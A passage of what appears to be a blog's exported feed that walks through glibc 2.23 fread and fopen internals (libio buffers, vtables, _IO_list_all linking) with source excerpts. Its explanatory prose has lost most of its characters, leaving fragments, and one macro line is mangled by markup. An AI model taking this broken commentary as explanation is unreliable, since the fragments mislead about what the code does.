class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_NO_READS</p><p>_IO_doallocbuf</p><p>_IO_read_base_IO_read_ptr_IO_read_end_IO_write_base_IO_write_ptr_IO_write_endfiledoalloc.c</p><img src="/2023/03/31/IO-FILE-fread/image-20230331225339043.png" alt="image-20230331225339043" style="zoom:67%;"><p>**_IO_SYSREAD<strong></strong>fp<strong></strong>_IO_buf_end - _IO_buf_base**_IO_buf_base</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSREAD(FP, DATA, LEN) JUMP2 (__read, FP, DATA, LEN)</span></span><br></pre></td></tr></table></figure><p><mark><strong>_IO_SYSREAD _&#x2F;readlibio&#x2F;fileops.c_IO_file_read</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_file_read (_IO_FILE *fp, <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">      ? read_not_cancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">      : read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_read)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/IO-FILE-fread/image-20230331230514508.png" alt="image-20230331230514508"></p><p>_fileno_IO_buf_base</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331230607785.png" alt="image-20230331230607785"></p><p>_IO_read_end,</p><img src="/2023/03/31/IO-FILE-fread/image-20230331231456814.png" alt="image-20230331231456814" style="zoom:67%;"><p>_IO_file_xsgetnwhile</p><p></p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232055813.png" alt="image-20230331232055813"></p><p>memcpyfopenbuffer</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232240158.png" alt="image-20230331232240158"></p><p>_IO_read_ptr</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232540181.png" alt="image-20230331232540181"></p><p>count0</p><h4 id="want-gt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-basefread4k"><a href="#want-gt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-basefread4k" class="headerlink" title="want &gt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_basefread4k"></a>want &gt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_basefread4k</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">count = want;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">    <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">        count -= want % block_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = _IO_SYSREAD (fp, s, count);</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s += count;</span><br><span class="line">want -= count;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setp(__fp, __p, __ep) \</span></span><br><span class="line"><span class="meta">       ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr \</span></span><br><span class="line"><span class="meta">    = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br></pre></td></tr></table></figure><p>macro</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base));</span><br><span class="line">((fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base, (fp)-&gt;_IO_write_end = (fp-&gt;_IO_buf_base));</span><br></pre></td></tr></table></figure><p><strong>read</strong><strong>write</strong><strong>6</strong>**_IO_buf_base**</p><p>4kblock_size4k_IO_SYSREADfopens +&#x3D; count;<br>want -&#x3D; count;4k4k</p><h2 id="vtable"><a href="#vtable" class="headerlink" title="vtable"></a>vtable</h2><ul><li><code>_IO_sgetn</code>vtable<code>_IO_file_xsgetn</code></li><li><code>_IO_doallocbuf</code>vtable<code>_IO_file_doallocate</code></li><li>vtable<code>_IO_file_doallocate</code>vtable<code>__GI__IO_file_stat</code></li><li><code>__underflow</code>vtable<code>_IO_new_file_underflow</code></li><li>vtable<code>_IO_new_file_underflow</code>vtable<code>__GI__IO_file_read</code>read</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fopen</title>
      <link href="/2023/03/30/IO-FILE-fopen/"/>
      <url>/2023/03/30/IO-FILE-fopen/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>glibc2.23</p><p>Ubuntu glibc <a href="https://launchpad.net/ubuntu/+source/glibc/">https://launchpad.net/ubuntu/+source/glibc/</a></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt-get install glibc-source</span><br><span class="line">sudo apt-get install libc6-dbg</span><br><span class="line">sudo apt-get install libc6-dbg:i386</span><br><span class="line">/usr/src/glibc</span><br></pre></td></tr></table></figure><p>.gdbinitdir path,gdbdir path</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span></span><br></pre></td></tr></table></figure><p><strong>&#x2F;include&#x2F;stdio.h</strong></p><p>fopenmacro</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#   <span class="keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure><p><strong>&#x2F;libio&#x2F;iofopen.c</strong></p><p>_IO_new_fopen__fopen_internal</p><p><strong>_IO_new_fopen</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>__fopen_internal</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;          <span class="comment">//(Multithreading)io</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>malloclocked_FILEnew_f</li><li><code>_IO_no_init</code> _IO_FILE_plus fp</li><li><code>_IO_file_init</code><code>_IO_list_all</code></li><li><code>_IO_file_fopen</code></li></ol><h3 id="IO-no-init-IO-FILE-plus-fp"><a href="#IO-no-init-IO-FILE-plus-fp" class="headerlink" title="_IO_no_init _IO_FILE_plus fp"></a><code>_IO_no_init</code> _IO_FILE_plus fp</h3><p><strong>_IO_no_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (_IO_FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">         <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_old_init flagsNULLfp</p><p><strong>_IO_old_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (_IO_FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</code></p><p><code>_wide_data</code>fp-&gt;_wide_data-&gt;_wide_vtabl_IO_wfile_jumps</p><p><img src="/2023/03/30/IO-FILE-fopen/image-20230330202938679.png" alt="image-20230330202938679"></p><h3 id="IO-file-init-IO-list-all"><a href="#IO-file-init-IO-list-all" class="headerlink" title="_IO_file_init_IO_list_all"></a><code>_IO_file_init</code><code>_IO_list_all</code></h3><p><code>__fopen_internal</code><code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS(*THIS*) (THIS)-&gt;vtable</span></span><br></pre></td></tr></table></figure><blockquote><p><code>*THIS*</code> </p><p> <code>THIS</code>  <code>*THIS*</code>  <code>*</code>  <code>THIS</code> </p></blockquote><p>fpvtable_IO_file_jumps</p><p><strong>&#x2F;libio&#x2F;fileops.c</strong> </p><p><strong>_IO_new_file_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_init _IO_file_init</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>&#x2F;libio&#x2F;genops.c</strong> </p><p><strong>_IO_link_in</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>_IO_LINKEDstreambuf_list_all</p><p>streambuf_IO_list_all_IO_LINKED10</p></blockquote><p>fp-&gt;file._flags &amp; _IO_LINKED01_chain_IO_list_all_IO_list_all_IO_FILE_plus</p><h3 id="IO-file-fopen"><a href="#IO-file-fopen" class="headerlink" title="_IO_file_fopen"></a><code>_IO_file_fopen</code></h3><p>__fopen_internal_IO_file_fopen</p><p><strong>libio&#x2F;fileops.c</strong></p><p><strong>_IO_file_fopen</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_fopen _IO_file_fopen</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_fopen (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">            <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  _IO_FILE *result;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    #define _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    _IO_new_file_init** fp-&gt;file._fileno = -1;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    fopenmode</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">      omode = O_RDWR;</span><br><span class="line">      read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">      oflags |= O_EXCL;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> O_CLOEXEC</span></span><br><span class="line">      oflags |= O_CLOEXEC;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      mode r+ rw+ a+ wb</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">/* Ignore.  */</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">              is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      .....................</span><br><span class="line">          .....................</span><br><span class="line">          .....................</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><strong>_IO_file_open</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_file_open (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot,</span><br><span class="line">           <span class="type">int</span> read_write, <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">     </span><br><span class="line">    fdesc = open_not_cancel (filename,</span><br><span class="line">                 posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      </span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">    &#123;</span><br><span class="line">      close_not_cancel (fdesc);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>open</p><p><img src="/2023/03/30/IO-FILE-fopen/image-20230331133757733.png" alt="image-20230331133757733"></p><p>,_fileno<code>_IO_link_in</code><code>_IO_list_all</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
